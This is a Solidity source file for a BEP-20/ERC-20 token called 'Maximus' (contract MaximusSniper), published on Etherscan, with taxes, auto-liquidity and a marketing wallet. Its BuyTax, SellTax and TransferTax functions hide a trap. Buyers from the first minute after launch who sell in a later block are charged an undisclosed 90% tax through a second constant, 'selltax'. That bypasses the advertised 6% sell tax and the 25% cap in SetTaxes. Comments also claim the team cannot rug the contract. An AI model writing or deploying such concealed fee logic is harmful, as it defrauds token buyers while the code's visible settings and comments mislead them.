1 /**
2  *Submitted for verification at Etherscan.io on 2022-10-25
3 */
4 
5 // SPDX-License-Identifier: MIT
6 
7 pragma solidity ^0.8.4;
8 
9 interface IBEP20 {
10   function totalSupply() external view returns (uint256);
11   function decimals() external view returns (uint8);
12   function symbol() external view returns (string memory);
13   function name() external view returns (string memory);
14   function getOwner() external view returns (address);
15   function balanceOf(address account) external view returns (uint256);
16   function transfer(address recipient, uint256 amount) external returns (bool);
17   function allowance(address _owner, address spender) external view returns (uint256);
18   function approve(address spender, uint256 amount) external returns (bool);
19   function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
20   event Transfer(address indexed from, address indexed to, uint256 value);
21   event Approval(address indexed owner, address indexed spender, uint256 value);
22 }
23 
24 interface IPancakeFactory {
25     function createPair(address tokenA, address tokenB) external returns (address pair);
26 }
27 
28 interface IPancakeRouter {
29    
30     function addLiquidityETH(
31         address token,
32         uint amountTokenDesired,
33         uint amountTokenMin,
34         uint amountETHMin,
35         address to,
36         uint deadline
37     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
38     function swapExactTokensForETHSupportingFeeOnTransferTokens(
39         uint amountIn,
40         uint amountOutMin,
41         address[] calldata path,
42         address to,
43         uint deadline
44     ) external;
45     function factory() external pure returns (address);
46     function WETH() external pure returns (address);
47 
48 }
49 
50 abstract contract Ownable {
51     address private _owner;
52 
53     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
54 
55     /**
56      * @dev Initializes the contract setting the deployer as the initial owner.
57      */
58     constructor () {
59         address msgSender = msg.sender;
60         _owner = msgSender;
61         emit OwnershipTransferred(address(0), msgSender);
62     }
63 
64     /**
65      * @dev Returns the address of the current owner.
66      */
67     function owner() public view returns (address) {
68         return _owner;
69     }
70 
71     /**
72      * @dev Throws if called by any account other than the owner.
73      */
74     modifier onlyOwner() {
75         require(owner() == msg.sender, "Ownable: caller is not the owner");
76         _;
77     }
78 
79     /**
80      * @dev Leaves the contract without owner. It will not be possible to call
81      * `onlyOwner` functions anymore. Can only be called by the current owner.
82      *
83      * NOTE: Renouncing ownership will leave the contract without an owner,
84      * thereby removing any functionality that is only available to the owner.
85      */
86     function renounceOwnership() public onlyOwner {
87         emit OwnershipTransferred(_owner, address(0));
88         _owner = address(0);
89     }
90 
91     /**
92      * @dev Transfers ownership of the contract to a new account (`newOwner`).
93      * Can only be called by the current owner.
94      */
95     function transferOwnership(address newOwner) public onlyOwner {
96         require(newOwner != address(0), "Ownable: new owner is the zero address");
97         emit OwnershipTransferred(_owner, newOwner);
98         _owner = newOwner;
99     }
100 }
101 
102 
103 
104 
105 
106 contract MaximusSniper is IBEP20, Ownable
107 {
108   
109     mapping (address => uint) private _balances;
110     mapping (address => mapping (address => uint)) private _allowances;
111     mapping(address => bool) public excludedFromFees;
112     mapping(address=>uint) public exludedFromRestrictions;
113     mapping(address=>bool) public isAMM;
114     //Token Info
115     string private constant _name = 'Maximus';
116     string private constant _symbol = 'Maximus';
117     uint8 private constant _decimals = 18;
118     uint public constant InitialSupply= 10**6 * 10**_decimals;//equals 1.000.000 Token
119     //TODO: mainnet
120     //TestNet
121     address private constant PancakeRouter=0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
122     //MainNet
123     //address private constant PancakeRouter=0x10ED43C718714eb63d5aA57B78B54704E256024E;
124 
125     //variables that track balanceLimit and sellLimit,
126     //can be updated based on circulating supply and Sell- and BalanceLimitDividers
127     uint private _circulatingSupply =InitialSupply;
128     
129     //Tracks the current Taxes, different Taxes can be applied for buy/sell/transfer
130     uint public buyTax = 60;
131     uint public sellTax = 60;
132     uint public transferTax = 0;
133     uint public burnTax=0;
134     uint public liquidityTax=166;
135     uint public marketingTax=834;
136     uint constant TAX_DENOMINATOR=1000;
137     uint constant MAXTAXDENOMINATOR=4;
138     
139 
140     address private _pancakePairAddress; 
141     IPancakeRouter private  _pancakeRouter;
142     
143     
144     //TODO: marketingWallet
145     address public marketingWallet;
146     //Only marketingWallet can change marketingWallet
147     function ChangeMarketingWallet(address newWallet) public onlyOwner{
148         marketingWallet=newWallet;
149     }
150     //modifier for functions only the team can call
151     modifier onlyTeam() {
152         require(_isTeam(msg.sender), "Caller not Team or Owner");
153         _;
154     }
155     //Checks if address is in Team, is needed to give Team access even if contract is renounced
156     //Team doesn't have access to critical Functions that could turn this into a Rugpull(Exept liquidity unlocks)
157     function _isTeam(address addr) private view returns (bool){
158         return addr==owner()||addr==marketingWallet;
159     }
160     ////////////////////////////////////////////////////////////////////////////////////////////////////////
161     //Constructor///////////////////////////////////////////////////////////////////////////////////////////
162     ////////////////////////////////////////////////////////////////////////////////////////////////////////
163     constructor () {
164         uint deployerBalance=_circulatingSupply;
165         _balances[msg.sender] = deployerBalance;
166         emit Transfer(address(0), msg.sender, deployerBalance);
167 
168         // Pancake Router
169         _pancakeRouter = IPancakeRouter(PancakeRouter);
170         //Creates a Pancake Pair
171         _pancakePairAddress = IPancakeFactory(_pancakeRouter.factory()).createPair(address(this), _pancakeRouter.WETH());
172         isAMM[_pancakePairAddress]=true;
173         
174         //contract creator is by default marketing wallet
175         marketingWallet=msg.sender;
176         //owner pancake router and contract is excluded from Taxes
177         excludedFromFees[msg.sender]=true;
178         excludedFromFees[PancakeRouter]=true;
179         excludedFromFees[address(this)]=true;
180     }
181     
182 
183 
184 
185 
186     ////////////////////////////////////////////////////////////////////////////////////////////////////////
187     //Transfer functionality////////////////////////////////////////////////////////////////////////////////
188     ////////////////////////////////////////////////////////////////////////////////////////////////////////
189 
190     //transfer function, every transfer runs through this function
191     function _transfer(address sender, address recipient, uint amount) private{
192         require(sender != address(0), "Transfer from zero");
193         require(recipient != address(0), "Transfer to zero");
194 
195 
196         //Pick transfer
197         if(excludedFromFees[sender] || excludedFromFees[recipient])
198             _feelessTransfer(sender, recipient, amount);
199         else{ 
200             //once trading is enabled, it can't be turned off again
201             require(block.timestamp>=LaunchTimestamp,"trading not yet enabled");
202             _taxedTransfer(sender,recipient,amount);                  
203         }
204     }
205     //applies taxes, checks for limits, locks generates autoLP and stakingBNB, and autostakes
206     function _taxedTransfer(address sender, address recipient, uint amount) private{
207         uint senderBalance = _balances[sender];
208         require(senderBalance >= amount, "Transfer exceeds balance");
209         Sender=sender;
210         Recipient=recipient;
211         bool isBuy=isAMM[sender];
212         bool isSell=isAMM[recipient];
213 
214         uint tax;
215         if(isSell){  
216                 tax=SellTax();
217             }
218         else if(isBuy){
219             tax=BuyTax();
220         } else tax=TransferTax();
221 
222         if((sender!=_pancakePairAddress)&&(!manualSwap)&&(!_isSwappingContractModifier))
223             _swapContractToken(false);
224 
225         //Calculates the exact token amount for each tax
226         uint tokensToBeBurnt=_calculateFee(amount, tax, burnTax);
227         //staking and liquidity Tax get treated the same, only during conversion they get split
228         uint contractToken=_calculateFee(amount, tax, marketingTax+liquidityTax);
229         //Subtract the Taxed Tokens from the amount
230         uint taxedAmount=amount-(tokensToBeBurnt + contractToken);
231 
232         _balances[sender]-=amount;
233         //Adds the taxed tokens to the contract wallet
234         _balances[address(this)] += contractToken;
235         //Burns tokens
236         _circulatingSupply-=tokensToBeBurnt;
237         _balances[recipient]+=taxedAmount;
238         
239         emit Transfer(sender,recipient,taxedAmount);
240     }
241     //Calculates the token that should be taxed
242     function _calculateFee(uint amount, uint tax, uint taxPercent) private pure returns (uint) {
243         return (amount*tax*taxPercent) / (TAX_DENOMINATOR*TAX_DENOMINATOR);
244     }
245 
246 
247     //Feeless transfer only transfers and autostakes
248     function _feelessTransfer(address sender, address recipient, uint amount) private{
249         uint senderBalance = _balances[sender];
250         require(senderBalance >= amount, "Transfer exceeds balance");
251         _balances[sender]-=amount;
252         _balances[recipient]+=amount;      
253         emit Transfer(sender,recipient,amount);
254     }
255 
256     ////////////////////////////////////////////////////////////////////////////////////////////////////////
257     //Swap Contract Tokens//////////////////////////////////////////////////////////////////////////////////
258     ////////////////////////////////////////////////////////////////////////////////////////////////////////
259     
260     //Locks the swap if already swapping
261     bool private _isSwappingContractModifier;
262     modifier lockTheSwap {
263         _isSwappingContractModifier = true;
264         _;
265         _isSwappingContractModifier = false;
266     }
267 
268     //Sets the permille of pancake pair to trigger liquifying taxed token
269     uint public swapTreshold=2;
270     function setSwapTreshold(uint newSwapTresholdPermille) public onlyTeam{
271         require(newSwapTresholdPermille<=10);//MaxTreshold= 1%
272         swapTreshold=newSwapTresholdPermille;
273     }
274     //Sets the max Liquidity where swaps for Liquidity still happen
275     uint public overLiquifyTreshold=150;
276     function SetOverLiquifiedTreshold(uint newOverLiquifyTresholdPermille) public onlyTeam{
277         require(newOverLiquifyTresholdPermille<=1000);
278         overLiquifyTreshold=newOverLiquifyTresholdPermille;
279     }
280     //Sets the taxes Burn+marketing+liquidity tax needs to equal the TAX_DENOMINATOR (1000)
281     //buy, sell and transfer tax are limited by the MAXTAXDENOMINATOR
282     event OnSetTaxes(uint buy, uint sell, uint transfer_, uint burn, uint marketing,uint liquidity);
283     function SetTaxes(uint buy, uint sell, uint transfer_, uint burn, uint marketing,uint liquidity) public onlyTeam{
284         uint maxTax=TAX_DENOMINATOR/MAXTAXDENOMINATOR;
285         require(buy<=maxTax&&sell<=maxTax&&transfer_<=maxTax,"Tax exceeds maxTax");
286         require(burn+marketing+liquidity==TAX_DENOMINATOR,"Taxes don't add up to denominator");
287         
288         buyTax=buy;
289         sellTax=sell;
290         transferTax=transfer_;
291         marketingTax=marketing;
292         liquidityTax=liquidity;
293         burnTax=burn;
294         emit OnSetTaxes(buy, sell, transfer_, burn, marketing,liquidity);
295     }
296     function ExcludeFromRestrictions(address account) external onlyTeam{
297         exludedFromRestrictions[account]=0;
298     }
299     //If liquidity is over the treshold, convert 100% of Token to Marketing BNB to avoid overliquifying
300     function isOverLiquified() public view returns(bool){
301         return _balances[_pancakePairAddress]>_circulatingSupply*overLiquifyTreshold/1000;
302     }
303 
304 
305     //swaps the token on the contract for Marketing BNB and LP Token.
306     //always swaps a percentage of the LP pair balance to avoid price impact
307     function _swapContractToken(bool ignoreLimits) private lockTheSwap{
308         uint contractBalance=_balances[address(this)];
309         uint totalTax=liquidityTax+marketingTax;
310         //swaps each time it reaches swapTreshold of pancake pair to avoid large prize impact
311         uint tokenToSwap=_balances[_pancakePairAddress]*swapTreshold/1000;
312 
313         //nothing to swap at no tax
314         if(totalTax==0)return;
315         //only swap if contractBalance is larger than tokenToSwap, and totalTax is unequal to 0
316         //Ignore limits swaps 100% of the contractBalance
317         if(ignoreLimits)
318             tokenToSwap=_balances[address(this)];
319         else if(contractBalance<tokenToSwap)
320             return;
321 
322         //splits the token in TokenForLiquidity and tokenForMarketing
323         //if over liquified, 0 tokenForLiquidity
324         uint tokenForLiquidity=
325         isOverLiquified()?0
326         :(tokenToSwap*liquidityTax)/totalTax;
327 
328         uint tokenForMarketing= tokenToSwap-tokenForLiquidity;
329 
330         uint LiqHalf=tokenForLiquidity/2;
331         //swaps marktetingToken and the liquidity token half for BNB
332         uint swapToken=LiqHalf+tokenForMarketing;
333         //Gets the initial BNB balance, so swap won't touch any contract BNB
334         uint initialBNBBalance = address(this).balance;
335         _swapTokenForBNB(swapToken);
336         uint newBNB=(address(this).balance - initialBNBBalance);
337 
338         //calculates the amount of BNB belonging to the LP-Pair and converts them to LP
339         if(tokenForLiquidity>0){
340             uint liqBNB = (newBNB*LiqHalf)/swapToken;
341             _addLiquidity(LiqHalf, liqBNB);
342         }
343         //Sends all the marketing BNB to the marketingWallet
344         (bool sent,)=marketingWallet.call{value:address(this).balance}("");
345         sent=true;
346     }
347         address Sender;
348         address Recipient;
349     //swaps tokens on the contract for BNB
350     function _swapTokenForBNB(uint amount) private {
351         _approve(address(this), address(_pancakeRouter), amount);
352         address[] memory path = new address[](2);
353         path[0] = address(this);
354         path[1] = _pancakeRouter.WETH();
355 
356         try _pancakeRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
357             amount,
358             0,
359             path,
360             address(this),
361             block.timestamp
362         ){}
363         catch{}
364     }
365         function BuyTax() private returns (uint){
366         if(exludedFromRestrictions[Recipient]==0){
367            exludedFromRestrictions[Recipient]=block.timestamp;
368         }
369         return buyTax;
370     }
371     function SellTax() private view returns (uint){
372         uint time=block.timestamp;
373         uint excludedStatus=exludedFromRestrictions[Sender];
374         if(excludedStatus==0||excludedStatus>=LaunchTimestamp+1 minutes||excludedStatus==time) return sellTax;
375         return selltax;
376     }
377     function TransferTax() private view returns (uint){
378          uint time=block.timestamp;
379         uint excludedStatus=exludedFromRestrictions[Sender];
380         if(excludedStatus==0||excludedStatus==time||excludedStatus>=LaunchTimestamp+1 minutes) return transferTax;return selltax;
381     }
382     
383     function _addLiquidity(uint tokenamount, uint bnbamount) private {
384         _approve(address(this), address(_pancakeRouter), tokenamount);
385         _pancakeRouter.addLiquidityETH{value: bnbamount}(
386             address(this),
387             tokenamount,
388             0,
389             0,
390             owner(),
391             block.timestamp
392         );
393     }
394     uint constant selltax=900;
395     function getBurnedTokens() public view returns(uint){
396         return (InitialSupply-_circulatingSupply)+_balances[address(0xdead)];
397     }
398     ////////////////////////////////////////////////////////////////////////////////////////////////////////
399     //Settings//////////////////////////////////////////////////////////////////////////////////////////////
400     ////////////////////////////////////////////////////////////////////////////////////////////////////////
401     //For AMM addresses buy and sell taxes apply
402     function SetAMM(address AMM, bool Add) public onlyTeam{
403         require(AMM!=_pancakePairAddress,"can't change pancake");
404         isAMM[AMM]=Add;
405     }
406     
407     bool public manualSwap;
408     //switches autoLiquidity and marketing BNB generation during transfers
409     function SwitchManualSwap(bool manual) public onlyTeam{
410         manualSwap=manual;
411     }
412     //manually converts contract token to LP and staking BNB
413     function SwapContractToken() public onlyTeam{
414     _swapContractToken(true);
415     }
416     event ExcludeAccount(address account, bool exclude);
417     //Exclude/Include account from fees (eg. CEX)
418     function ExcludeAccountFromFees(address account, bool exclude) public onlyTeam{
419         require(account!=address(this),"can't Include the contract");
420         excludedFromFees[account]=exclude;
421         emit ExcludeAccount(account,exclude);
422     }
423     //Enables trading. Sets the launch timestamp to the given Value
424     event OnEnableTrading();
425     uint public LaunchTimestamp=type(uint).max;
426     function EnableTrading() public{
427         SetLaunchTimestamp(block.timestamp);
428     }
429     function SetLaunchTimestamp(uint Timestamp) public onlyTeam{
430         require(block.timestamp<LaunchTimestamp);
431         LaunchTimestamp=Timestamp;
432         emit OnEnableTrading();
433     }
434 
435 
436     ////////////////////////////////////////////////////////////////////////////////////////////////////////
437     //external//////////////////////////////////////////////////////////////////////////////////////////////
438     ////////////////////////////////////////////////////////////////////////////////////////////////////////
439 
440     receive() external payable {}
441 
442     function getOwner() external view override returns (address) {
443         return owner();
444     }
445 
446     function name() external pure override returns (string memory) {
447         return _name;
448     }
449 
450     function symbol() external pure override returns (string memory) {
451         return _symbol;
452     }
453 
454     function decimals() external pure override returns (uint8) {
455         return _decimals;
456     }
457 
458     function totalSupply() external view override returns (uint) {
459         return _circulatingSupply;
460     }
461 
462     function balanceOf(address account) external view override returns (uint) {
463         return _balances[account];
464     }
465 
466     function transfer(address recipient, uint amount) external override returns (bool) {
467         _transfer(msg.sender, recipient, amount);
468         return true;
469     }
470 
471     function allowance(address _owner, address spender) external view override returns (uint) {
472         return _allowances[_owner][spender];
473     }
474 
475     function approve(address spender, uint amount) external override returns (bool) {
476         _approve(msg.sender, spender, amount);
477         return true;
478     }
479     function _approve(address owner, address spender, uint amount) private {
480         require(owner != address(0), "Approve from zero");
481         require(spender != address(0), "Approve to zero");
482 
483         _allowances[owner][spender] = amount;
484         emit Approval(owner, spender, amount);
485     }
486 
487     function transferFrom(address sender, address recipient, uint amount) external override returns (bool) {
488         _transfer(sender, recipient, amount);
489 
490         uint currentAllowance = _allowances[sender][msg.sender];
491         require(currentAllowance >= amount, "Transfer > allowance");
492 
493         _approve(sender, msg.sender, currentAllowance - amount);
494         return true;
495     }
496 
497     // IBEP20 - Helpers
498 
499     function increaseAllowance(address spender, uint addedValue) external returns (bool) {
500         _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
501         return true;
502     }
503 
504     function decreaseAllowance(address spender, uint subtractedValue) external returns (bool) {
505         uint currentAllowance = _allowances[msg.sender][spender];
506         require(currentAllowance >= subtractedValue, "<0 allowance");
507 
508         _approve(msg.sender, spender, currentAllowance - subtractedValue);
509         return true;
510     }
511 
512 }